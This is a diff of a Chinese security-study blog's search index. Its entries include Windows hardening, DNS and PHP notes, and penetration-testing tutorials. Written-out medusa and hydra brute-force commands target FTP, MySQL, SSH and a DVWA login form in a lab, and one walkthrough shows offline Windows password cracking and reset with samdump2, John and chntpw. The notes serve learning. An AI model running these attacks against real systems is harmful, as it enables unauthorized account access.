+    <content type="text"><![CDATA[在修改前在防火墙添加修改远程端口的允许通过的策略，或者暂时关闭防火墙，不然修改完端口号远程连接不上。运行regedit找到注册表[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] PortNumber位置，点击十进制，修改远程连接的端口号，这里以4567为列。 找到注册表[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] 双击右边 PortNumber-点十进制-更改值为：4567 使其注册表生效，这里windows server2008/2012 为例，重启生效， 或者运行service.msc，找到remote desktop service服务管理重启生效 这里以windows server2008/2012 为例，像xp、server2003比较旧的系统是没有remote desktop service服务,需要重启才能生效]]></content>
+      <categories>
+        <category>windows</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用medusa破解密码]]></title>
+    <url>%2F2020%2F07%2F11%2F%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[medusa -h查看帮助 主要参数： -h 目标域名或ip-H 包含ip后域名的文件-u 用户名测试-U 包含要测试的用户名的文件-p 密码测试-P 包含要测试的密码的文件-e[n/s/ns] 添加其他密码检查条件 (无密码,密码 = 用户名)-M 要执行的模块的名称 (不包括. mod 扩展)-d 输出所有模块-n 用于非默认 TCP 端口号-s 启用ssl medusa -d 输出所有模块 medusa破解ftp 靶机开启ftp服务，攻击机进行破解medusa -u root -P comon.lst -h 192.168.200.243 -M ftp medusa破解mysqlmedusa -u root -P comon.lst -h 192.168.200.244 -e ns -M mysql mysql无密码 medusa破解sshmedusa -u root -P comon.lst -h 192.168.200.244 -e ns -M ssh]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用hydra破解密码]]></title>
+    <url>%2F2020%2F07%2F11%2F%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[1.windows密码破解 smb密码破解设置windows账号密码，linux的ssh登陆密码破解hydra破解ftp登陆账号密码hydra破解表单密码，这里是我是dvwa页面破解。密码破解的特征是密码正确会跳转到index.php页面。使用post方式提交密码。hydra -l admin -P comon.lst 192.168.200.244 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vxhydra是hydra的图形界面]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[windows服务器主机加固]]></title>
+    <url>%2F2020%2F07%2F11%2Fwindows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA%2F</url>
+    <content type="text"><![CDATA[1.禁用Guest账户和无关账户Guest账户为黑客入侵打开了方便之门，黑客使用Guest账户可以进行提权。禁用Guest账户是最好的选择。操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;本地用户和组-&gt;用户-&gt;Guest”“账户已禁用”打勾启用加固后： 2.密码策略加强 操作系统、用户身份鉴别信息应具有不易被冒用的特点，口令应复杂度要求并定期更换。 操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;密码策略”; “密码必须符合复杂度要求” 设 置为“启用” “密码长度最小值”设置为“8个字符”“密码最长使用期限”设置为“90天”“强制密码历史”设置为“记住5个密码”“用可以还原的加密来存储密码”设置为“禁用” 加固前：加固后： 3.账户锁定策略加强对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过5 次（不含5 次），锁定该用户使用的账号。操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;帐户锁定策略”： “账户额锁定阀值”设置为 5 次“账户锁定时间”设置为 15分钟“复位账户锁定计数器”设置为 15分钟 加固前：加固后 4.设置安全审计在主机的审核策略上设置日志审核策略操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;审核策略”在主机的审核策略上设置日志审核策略： 审计帐户登录事件： 成功，失败 审计帐户管理： 成功，失败 审计目录服务访问： 成功，失败审计登录事件： 成功，失败 审计对象访问： 成功，失败 审计策略更改： 成功，失败 审计特权使用： 成功，失败 审计系统事件： 成功，失败审计过程追踪： 成功，失败 加固前:加固后: 5.设置不显示上次使用的用户名在本地安全设置系统登录时不显示上次使用的用户名。进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项”； “交互式登录：不显示上次的用户名”设置为“已启用” 加固前：加固后： 6启用主机安全选项的”关机前清除虚拟内存页面”启用主机安全选项的“关机前清除虚拟内存页面操作流程:进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项 关机：清除虚拟页面文件内存”设置为“已启用” 加固前：加固后： 7.配置日志文件大小 配置日志文件容量，避免受到未预期的删除、修改或覆盖等 操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;事件查看器-&gt;windows日志”，配置加固前： 加固后： 8.磁盘配额配置磁盘配额可以限制指定账户能够使用的磁盘空间,这样可以避免因某个用户的过度使用磁盘空间造成其他用户无法正常工作甚至影响系统运行操作流程：进入“我的电脑-&gt;C盘-&gt;属性-&gt;配额”， “启用磁盘管理”设置为启用“磁盘空间限制为”设置为”90GB”“将警告等级设为”设置为”90GB”“用户超出配额限制时记录事件（G）”打勾启用“用户超过警告等级时记录事件（V）” 打勾启用 加固前：加固后： 9.远程会话策略默认情况下，远程桌面服务允许用户从远程桌面服务会话开连接，而不用注销和结束会话。启用此策略设置，则达到指定时间后将从服务器中删除已断开连接的会话操作流程：进入“运行-&gt;gpedit.msc-&gt;计算机配置-&gt;管理模板-&gt;wondows组件-&gt;远程服务-&gt;远程桌面会话主机-&gt;会话时间限制”， “设置已中断会话的时间限制”设置为“已启用”“结束已断开连接的会话”设置为“5分钟” 加固前： 加固后:]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>安全加固</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[kali破解密码，pe破解密码]]></title>
+    <url>%2F2020%2F07%2F11%2Fwindows%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%2F</url>
+    <content type="text"><![CDATA[kali破解windows密码1.镜像u盘启动（这里用虚拟机模拟） windows增加test用户设置密码，iso镜像：kali 2.BOIS启动，在bois引导中把cd/rom方式置顶。F10保持退出，进入kali安装界面显示，选第一，进入kali。 挂载WINDOW的c盘，破解密码 fdilk -l查看磁盘!并挂载C盘 使用samdump2合并导出SAM和system数据，cat数据内容，jonh破解密码删除windows密码 chntpw修改SAM!这里选1编辑密码选择修改用对应的ID选择1清除密码成功后选q退出，再选y选择保存 重启入bois选择硬盘引导，进入windows选择test用户会发现无需密码登陆了。 利用pe修改密码 创建一个或多个用户，u盘制作pe，（这里使用微pe软件），虚拟机在设置中添加磁盘代理u盘。在bois中把scsi设为第一引导，然后F10保存退出 在pe中选择windows密码修改软件（NTPWEdit）修改密码，然后把bois引导调回磁盘引导开机，可以发现windows用户密码已修改。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[windows server 2012 dns服务器搭建]]></title>
+    <url>%2F2020%2F07%2F11%2Fwindows%20server2012%20dns%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
+    <content type="text"><![CDATA[1.安装dns服务器打开服务器管理器，仪表板———&gt;添加角色和功能，下一步下一步，到了服务器角色打勾选择DNS服务器，然后等待安装完成，在所有应用中可以看到多了一个dns，点击打开 2.创建正向主要区域正向查找区域用于通过域名查询ip地址右键正向查找区域——&gt;新建区域——&gt;下一步，区域类型选择主要区域区域名称是域名的意思，这里我test.com示范区域文件，没有需求默认就好不允许动态更新 3.创建反向主要区域反向查找区域用于通过ip地址查询dns名称右键反向查找区域——&gt;新建区域——&gt;下一步，区域类型选择主要区域，下一步ipv4方向查找区域输入dns服务器的网络id默认文件，并且不动态更新 4.创建资源记录&amp;测试配置测试环境在客户端配置网卡dns服务器指向 创建正向查找资源记录&amp;测试1.建立test.com的域名解析右建test.com——&gt;新建主机，名称为空，ip为测试的ip，这里我用dns服务器的ip为测试,添加主机 2.建立www.test.com解析操作同1 3.建立11.test.com解析到www.test.com右建test.com——&gt;新建别名，别名为11，完全限定的域名为默认，目标主机的完全合格的域名填www.test.com添加主机 4.测试正向解析域名 创建反向查找资源记录&amp;测试1.创建反向查找资源记录右键反向区域名称——&gt;新建指针主机IP地址我这里选择dns服务器ip测试，限定域名为默认，主机名为www.test1.com在建一个主机名为test的，操作同上 2.测试反向查找测试成功]]></content>
+      <categories>
+        <category>windows</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[theharvester的使用]]></title>
-    <url>%2F2019%2F03%2F06%2Ftheharvester%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
+    <url>%2F2020%2F07%2F11%2Ftheharvester%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
     <content type="text"><![CDATA[TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。这些信息将在后期的渗透测试阶段发挥巨大的作用。 d 参数制定目标域 -l 参数制定数量 -b 参数指定接口 -s 制定起始数值theharvester -d qq.com -l 200 -b baidu theharvester -d 163.com -b baidu]]></content>
       <categories>
         <category>渗透测试</category>
@@ -350,32 +196,186 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Metagoofil]]></title>
-    <url>%2F2019%2F03%2F06%2FMetagoofil%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
-    <content type="text"><![CDATA[Metagoofil是由Christian Martorella编写的功能强大的元数据手机工具。它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能。 参数 描述， -d 所搜寻的域名。 -t 要下载的文档类型（pdf，doc，docx，ppt，xls，ods等） -l 搜索结果限制（默认200个） -h 使用目录中的文档处理（”yes”表示本地分析） -n 文件下载限制 -o 工作目录 -f 输出文件 #metagoofil -d baidu.com -l 20 -t doc,pdf -n 5 -f test.html -o test #metagoofil -d wenku.baidu.com -t doc,xls -l 200 -n 50 -o metafiles -f metaResult.html]]></content>
+    <title><![CDATA[pw-inspector筛选字典内容]]></title>
+    <url>%2F2020%2F07%2F11%2Fpw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9%2F</url>
+    <content type="text"><![CDATA[pw-inspector -h查看帮助 -i 输入文件-o 输出文件-m 有效密码的最小长度-M 有效密码的最大长度-l 小写字母-u 大学字母-p 可打印的字符 -s 特殊字符-n 数字 pw-inspector -i pass.lst -o up.lst -l筛选pass.lst字典小写字符输出为lp.lst(包含一个小写字母也算) pw-inspector -i pass.lst -o up.lst -l u筛选pass.lst字典小写字符输出为up.lst(包含一个大写字母也算)]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[重装系统及相关知识点]]></title>
-    <url>%2F2019%2F03%2F06%2F%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%2F</url>
-    <content type="text"><![CDATA[1.iso镜像直接安装在下个OSI镜像后,双击打开安装,在选择期间,可以选择把是否把用户数据删除,不用删除也可以安装,当然你想来个完全全新的系统,可以选择删除数据.,再等电脑重启就好了 2.ghost 安装（美国赛门铁克公司旗下的硬盘备份还原工具）s Ghost系统是指通过赛门铁克公司（Symantec Corporation）出品的Ghost在装好的操作系统中进行镜像克隆的版本，通常GHOST用于操作系统的备份，在系统不能正常启动的时候用来进行恢复的。 Ghost重装是最简单最方便的重装系统方式，几乎所有的电脑门店和维修店和非官方的系统光盘都是基于Ghost进行重装的，Ghost重装具有操作方便，重装速度快，方法简单的优点Ghost重装系统是从网上下载的操作系统GHO镜像，然后使用Ghost工具（一般使用Onekey Ghost）进行重装。这些镜像系统文件XP的一般在600多M，Win7一般在3–4G左右，Win8一般在3–4G左右 3.U盘安装U盘装系统是目 前一个较为方便的重装系统的方法，只需下载U盘启动盘制作工具制作U盘启动盘，然后在进入系统时设置U盘启动即可，制作工具可以到网上下载。1.下载ISO镜像 2.使用UltraISO文件将系统ISO写入U盘.3.在BIOS界面上将U盘调整为第一启动项（也可以用电脑U盘启动热键）。4.插入U盘并重启计算机，会自动进入安装程序的安装界面，按照提示安装即可。 4.PE安装PE，Windows PE Windows Preinstallation Environment，Windows预安装环境，Windows预先安装环境（Microsoft Windows Preinstallation Environment，简称Windows PE或WinPE）是简化版的Windows XP、Windows Server 2003、Windows Vista、Windows 7 、Windows 8和Windows 10。WinPE是以光盘或其他可携设备作媒介。WinPE作用是方便大企业作出工作站和服务器的企划、给“原始设备制造商”（OEM）制造自定义的Windows操作系统、取代MS-DOS的磁片。Windows PE可理解为Windows的LiveCD。 UEFI 新型UEFI，全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。 BIOS即Basic Input/Output System，翻成中文是“基本输入/输出系统”，是一种所谓的“固件”，负责在开机时做硬件启动和检测等工作，并且担任操作系统控制硬件时的中介角色。因为硬件发展迅速，传统式（Legacy）BIOS 成为进步的包袱，现在已发展出最新的UEFI（Unified Extensible Firmware Interface）可扩展固件接口，相比传统 BIOS 的来说，未来将是一个“没有特定 BIOS”的电脑时代。 与legacy BIOS 相比，UEFI最大的几个区别在于： 编码99%都是由C语言完成； 一改之前的中断、硬件端口操作的方法，而采用了Driver/protocol的新方式； 将不支持X86实模式，而直接采用Flat mode（也就是不能用DOS了，现在有些 EFI 或 UEFI 能用是因为做了兼容，但实际上这部分不属于UEFI的定义了）； 输出也不再是单纯的二进制code，改为Removable Binary Drivers； OS启动不再是调用Int19，而是直接利用protocol/device Path； 对于第三方的开发，前者基本上做不到，除非参与BIOS的设计，但是还要受到ROM的大小限制，而后者就便利多了。7.弥补BIOS对新硬件的支持不足的问题。BIOS它是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、开机后自检程序和系统自启动程序，它可从CMOS中读写系统设置的具体信息。 其主要功能是为计算机提供最底层的、最直接的硬件设置和控制。此外，BIOS还向作业系统提供一些系统参数。系统硬件的变化是由BIOS隐藏，程序使用BIOS功能而不是直接控制硬件。现代作业系统会忽略BIOS提供的抽象层并直接控制硬件组件。 BIOS芯片中主要存放：●自诊断程序：通过读取CMOSRAM中的内容识别硬件配置，并对其进行自检和初始化；● CMOS设置程序：引导过程中，用特殊热键启动，进行设置后，存入CMOS RAM中；● 系统自举装载程序：在自检成功后将磁盘相对0道0扇区上的引导程序装入内存，让其运行以装入DOS系统；● 主要I/O设备的驱动程序和中断服务：由于BIOS直接和系统硬件资源打交道，因此总是针对某一类型的硬件系统，而各种硬件系统又各有不同，所以存在各种不同种类的BIOS，随着硬件技术的发展，同一种BIOS也先后出现了不同的版本，新版本的BIOS比起老版本来说，功能更强。 GRUB(GRand Unified Bootloader) GNU GRUB 和GRUB是GRand Unified Bootloader的缩写，它是一个多重操作系统启动管理器。用来引导不同系统，如windows，linux。在X86架构的机器中，Linux、BSD 或其它Unix类的操作系统中GRUB、LILO 是大家最为常用，应该说是主流。Windows也有类似的工具NTLOADER；比如我们在机器中安装了Windows 98后，我们再安装一个Windows XP ，在机器启动的会有一个菜单让我们选择进入是进入Windows 98 还是进入Windows XP。NTLOADER就是一个多系统启动引导管理器，NTLOADER 同样也能引导Linux，只是极为麻烦罢了。在PowerPC 架构的机器中，如果安装了Linux的Powerpc 版本，大多是用yaboot 多重引导管理器，比如Apple机用的是IBM PowerPC处理器，所以在如果想在Apple机上，安装Macos 和Linux Powerpc 版本，大多是用yaboot来引导多个操作系统。因为X86架构的机器仍是主流， 所以目前GRUB和LILO 仍然是我们最常用的多重操作系统引导管理器。 引导过程由硬盘启动时，BIOS通常是转向第一块硬盘的第一个扇区，即主引导记录(MBR)。装载GRUB和操作系统的过程，包括以下几个操作步骤： 装载记录基本引导装载程序所做的唯一的事情就是装载第二引导装载程序。 装载Grub这第二引导装载程序实际上是引出更高级的功能，以允许用户装载一个特定的操作系统。 装载系统如linux内核。GRUB把机器的控制权移交给操作系统。不同的是，微软操作系统都是使用一种称为链式装载的引导方法来启动的，主引导记录仅仅是简单地指向操作系统所在分区的第一个扇区。 MBR（Main Boot Record）主引导记录（MBR）是位于磁盘最前边的一段引导（Loader）代码。它负责磁盘操作系统(DOS)对磁盘进行读写时分区合法性的判别、分区引导信息的定位，它由磁盘操作系统(DOS)在对硬盘进行初始化时产生的。通常，我们将包含MBR引导代码的扇区称为主引导扇区。因这一扇区中，引导代码占有绝大部分的空间，故而将习惯将该扇区称为MBR扇区（简称MBR）。由于这一扇区承担有不同于磁盘上其他普通存储空间的特殊管理职能，作为管理整个磁盘空间的一个特殊空间，它不属于磁盘上的任何分区，因而分区空间内的格式化命令不能清除主引导记录的任何信息。 MBR结构图主引导扇区由三个部分组成(共占用512个字节)：1.主引导程序即主引导记录（MBR）（占446个字节）可在FDISK程序中找到，它用于硬盘启动时将系统控制转给用户指定的并在分区表中登记了的某个操作系统。2.磁盘分区表项（DPT，Disk Partition Table)由四个分区表项构成（每个16个字节）。负责说明磁盘上的分区情况，其内容由磁盘介质及用户在使用FDISK定义分区时决定。（具体内容略）3.结束标志（占2个字节）其值为AA55，存储时低位在前，高位在后，即看上去是55AA（十六进制）。]]></content>
-      <tags>
-        <tag>计算机应用</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[proxychans的使用]]></title>
-    <url>%2F2019%2F03%2F06%2Fproxychans%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
+    <url>%2F2020%2F07%2F11%2Fproxychans%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
     <content type="text"><![CDATA[vim /etc/proxychains.conf //编辑proxychansdai 在配置内容最后一行保持退出 # proxychains.conf VER 3.1 # # HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS. # # The option below identifies how the ProxyList is treated. # only one option should be uncommented at time, # otherwise the last appearing option will be accepted # #dynamic_chain # # Dynamic - Each connection will be done via chained proxies # all proxies chained in the order as they appear in the list # at least one proxy must be online to play in chain # (dead proxies are skipped) # otherwise EINTR is returned to the app # strict_chain # # Strict - Each connection will be done via chained proxies # all proxies chained in the order as they appear in the list # all proxies must be online to play in chain # otherwise EINTR is returned to the app # #random_chain # # Random - Each connection will be done via random proxy # (or proxy chain, see chain_len) from the list. # this option is good to test your IDS :) # Make sense only if random_chain #chain_len = 2 # Quiet mode (no output from library) #quiet_mode # Proxy DNS requests - no leak for DNS data proxy_dns # Some timeouts in milliseconds tcp_read_time_out 15000 tcp_connect_time_out 8000 # ProxyList format # type host port [user pass] # (values separated by &#39;tab&#39; or &#39;blank&#39;) # # # Examples: # # socks5 192.168.67.78 1080 lamer secret # http 192.168.89.3 8080 justu hidden # socks4 192.168.1.49 1080 # http 192.168.39.93 8080 # # # proxy types: http, socks4, socks5 # ( auth types supported: &quot;basic&quot;-http &quot;user/pass&quot;-socks ) # [ProxyList] # add proxy here ... # meanwile # defaults set to &quot;tor&quot; socks5 127.0.0.1 8082 测试代理成功与否 proxychains curl myip.ipip.net //查看当前ip 使用方法就是在每个命令下前加个proxychains.]]></content>
       <tags>
         <tag>linux</tag>
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[php学习笔记]]></title>
+    <url>%2F2020%2F07%2F11%2Fphp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
+    <content type="text"><![CDATA[1.PHP var_dump() 函数返回变量的数据类型和值：&lt;?php $x = 5985; var_dump($x); //运行结果int(5985) 2.设置 PHP 常量设置常量，使用 define() 函数，函数语法如下： bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) &lt;?php // 区分大小写的常量名 define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;); &lt;br&gt; echo GREETING; // 输出 &quot;欢迎访问 Runoob.com&quot; &lt;br&gt; echo &#39;&lt;\br&gt;&#39;; &lt;br&gt; echo greeting; // 输出 &quot;greeting&quot; ?&gt; 常量在定义 后，默认是全局变量，可以在整个运行的脚本的任何地方使用。 3.字符串函数 并置运算符 (.) 用于把两个字符串值连接起来。 下面的实例演示了如何将两个字符串变量连接在一起： 实例 &lt;?php $txt1=&quot;Hello world!&quot;; &lt;br&gt; $txt2=&quot;What a nice day!&quot;; &lt;br&gt; echo $txt1 . &quot; &quot; . $txt2; &lt;br&gt; ?&gt; //运行结果：Hello world! What a nice day! PHP strlen() 函数有时知道字符串值的长度是很有用的。strlen() 函数返回字符串的长度（字符数）。&lt;?php echo strlen(&quot;Hello world!&quot;); ?&gt; 运行结果：12 PHP strpos() 函数 strpos() 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。 &lt;?php echo strpos(&quot;Hello world!&quot;,&quot;world&quot;); ?&gt; 输出：6 PHP strpos() 查找字符串首次出现的位置 PHP strrpos() 获取指定字符串在目标字符串中最后一次出现的位置 $url=&#39;C:\web\apache2\htdoc\cat.jpg&#39;; $pos=strrpos($url, &#39;\\&#39;); //截取文件输出名称：cat.jpg echo substr($url, $pos+1); //截取文件所在路径，输出结果：C:\web\apache2\htdoc\ str_replace() 用于对字符串中的某些字符的替换 $tel = &#39;1881088188&#39;; $len=4; $replace =str_repeat(&#39;*&#39;,$len); echo stubstr_replace($tel, $replace, 3, $len); //输出结果：188****1888 substr() 用于获取字符串的子串 explode() 使用一个字符串分割另一个字符串 implode() 用于指定的连接符键数组拼接成一个字符串 trim（） 去除字符串首尾处的空白字符 $str = &#39; These are a few word :).... &#39;; echo &#39;原字符串:&#39; .$str. &#39;&lt;br&gt;&#39;; echo &#39;去空白后的字符串:&#39;.trim($str); str_repeat() 重复一个字符串 strcmp() 用于判断两个字符串的大小 if (strcmp(&#39;ye_PHP&#39;, &#39;yePHP&#39;)) echo &#39;not the same } else { echo &#39;the same string&#39;; } 4.数组 数组创建在 PHP 中，array() 函数用于创建数组：array();PHP 数值数组这里有两种创建数值数组的方法： 自动分配 ID 键（ID 键总是从 0 开始）： $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); 人工分配 ID 键： $cars[0]=&quot;Volvo&quot;; $cars[1]=&quot;BMW&quot;; $cars[2]=&quot;Toyota&quot; ; &lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;; \\输出结果：I like Volvo, BMW and Toyota. count() 函数用于返回数组的长度（元素的数量）： &lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); echo count($cars); ?&gt; 关联数组是使用您分配给数组的指定的键的数组。这里有两种创建关联数组的方法：$age=array(“Peter”=&gt;”35”,”Ben”=&gt;”37”,”Joe”=&gt;”43”); &lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); echo &quot;Peter is &quot; . $age[&#39;Peter&#39;] . &quot; years old.&quot;; ?&gt; foreach()遍历数组$info=[&#39;id&#39;=&gt;1,&#39;usr&#39;=&gt;&#39;Jacie&#39;,&#39;age&#39;=&gt;18]； //使用方法一 foreach ($info as $k=&gt;$v){ //$k=键名，$v=键值 echo $k . &#39;:&#39; .$v. &#39; &#39;; //输出结果：id= 1 usr: Jacie age: 18 } //使用方法二 foreach($info as $v){ echo $v .&#39;&#39;; //输出结果：1 Jacie 18 } 5.类 类的定义class 类名 { //成员属性 //成员方法 } 类名后的“{}”中是==类的成员==，在类中声明得==变量是成员属性==，在类中声明得==函数是成员方法== 实例化类 $对象名 = new 类名([参数1，参数2，...]); 对象-&gt;成员 “-&gt;”对象成员访问符 &lt;?php class Person //创建类 { public $name = &#39;Tom&#39;; //成员属性 public $age ; } $p = new Person (); echo $p-&gt;name; //获取默认属性值，输出结果：Tom $p-&gt;name = &#39;Lucy&#39; //修改默认属性值 echo $p-&gt;name; //输出结果：Lucy $p-&gt;age=15; //为属性赋值 echo $p-&gt;age; //输出:15 unset ($p-&gt;age); //删除属性值 var_dump(isset($p-&gt;age)); //检测属性是否设置，输出：bool(false) var_dump($property_exists(&#39;Person&#39;,&#39;age&#39;))； //检验属性是否定义，输出：bool(true) 6.mysql连接\\连接数据库 $link = mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;12344&#39;,&#39;sqlname&#39;,&#39;3306&#39;) \\查看数据库连接是否正确 echo $link ? &#39;连接数据库成功&#39; ：&#39;连接数据库失败&#39; 设置字符集 \\ 数据库连接 $link = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;); \\ 设置字符集 mysql_set_charset($link,&#39;utf8&#39;); mysql_query($link,&#39;USE &#39;istheima&#39;); \\mysql_qurey函数包含sql语句 result = mysqli_query($link,&#39;SHOW TABLES&#39;); if ($result){ exit(&#39;错误信息：&#39;.mysqli_error($link)); } 7.web表单交互 post方式&lt;form mothod=&quot;post&quot;&gt; 用户名:&lt;input type = &#39;text&#39; name=&#39;username&#39;&gt; 密码:&lt;input type = &quot;password&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot; vlue=&quot;登录&quot;&gt; &lt;/form&gt; 接收表单的密码和数据if (isset($_POST[&#39;username&#39;])) &amp;&amp; isset($_POST[&#39;password&#39;]){ $username = $_POST[&#39;username&#39;]; $password = $_POST[&#39;password&#39;]; } get方式把上面html代码改成get，提交表单时得到一串url，如下：http://localhost/login.php?username=test$password=123456上述url中，”?”为参数信息，参数为参数名和参数值组成，”&amp;”为分隔符输出表单的密码和数据if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset （&#39;$_GET[password]&#39;）){ echo $_GET[&#39;username&#39;]; echo $_GET[&#39;password&#39;]; } 8.cookie与session创键 cookie得创建bool setcookie( string $name, //cookie的名（必选） string $value = &quot;&quot;; //cookie的值（可选） int $expire = 0, //cookie的有效期（可选） string $path = &quot;&quot;, //cookie在服务器的路径（可选） string $domin = &quot;&quot;, //cookie的有效域名（可选） bool $secure = false, //指定是否通过安全的https连接来传输（可选） \\设置cookie setcookie(&#39;aaa&#39;,&#39;123&#39;); setcookie(&#39;bbb&#39;,&#39;456&#39;); \\设置cookie过期时间 setcookie(&#39;data&#39;,&#39;php&#39;); //未指定过期时间，在会话结束时过期 setcookie(&#39;data&#39;,&#39;php&#39;,time()+1800); //30分钟过期 setcookie(&#39;data&#39;,&#39;php&#39;,time()+60*60*24); //一天后过期 \\删除cookie setcookie(&#39;data&#39;,&#39;&#39;,time()-1); //立即过期相当于过期 session的基本使用`&lt;?phpsession_start(); //开启session的函数$_SESSION[‘username’] = ‘tom’; //向session添加字符串$_SESSIOMN[‘id’]=[‘1’,’2’,’3’]; //向session添加数组if(isset($_SESSION[‘test’])){ $test = $_SESSION[‘test’] //判断session是否有存在test并将其读取}unset($_SESSION[‘username’]); //删除单个session$_SESSION = []; //删除所有数据session_destroy(); //结束所有对话 &lt;?phpecho strlen(“Hello world!”);?&gt; 运行结果：12`]]></content>
+      <categories>
+        <category>code</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[nmap扫描]]></title>
+    <url>%2F2020%2F07%2F11%2Fnmap%E6%89%AB%E6%8F%8F%2F</url>
+    <content type="text"><![CDATA[nmap是一款开源免费的网络发现和安全审计工具，扫描端口、操作系统的版本、端口对应运行的服务等等。zenmap是nmap官方提供的图形界面工具 nmap XXX.XXX.XXX.XXX 完整扫描 nmap -v XXX.XXX.XXX.XXX 打印每一步扫描 nmap -f XXX.XXX.XXX.XXX 扫描常见的端口 nmap -sV XXX.XXX.XXX.XXX 检测服务详细信息 nmap -O XXX.XXX.XXX.XXX 检测主机操作系统以及硬件信息 nmap –script=vuln XXX.XXX.XXX.XXX 扫描目标系统漏洞 namp -sT xxx.xxx.xxx.xxx TCP扫描，这种扫描可能会被目标机系统日志记录 namp -sS tcp syn（半扫描）扫描，一般不会被目标机系统日志记录 namp -sU udp扫描，但是一般不可靠 nmap -v（显示每一条信息） -sn （扫描存活主机，不扫描端口）-PE（通过PE确定机器是否开启） XXX.XXX.XXX.1/24 扫描整个子网 nmap -v -sn -PE XXX.XXX.XXX.1-5指定范围扫描 nmap -v -p 135 XXX.XXX.XXX.XXX扫描指定135端口（多个端口逗号分隔） nmap -sS XXX.XXX.XXX.XXX SYN扫描，隐蔽扫描（不需要创建完整链接）端口：默认情况下，nmap会扫描1000个最有可能开放的tcp端口 namp默认（局域网）扫描 扫描系统信息 扫描系统漏洞 局域网扫描 指定端口扫描，如果未指定端口默认1-1000]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
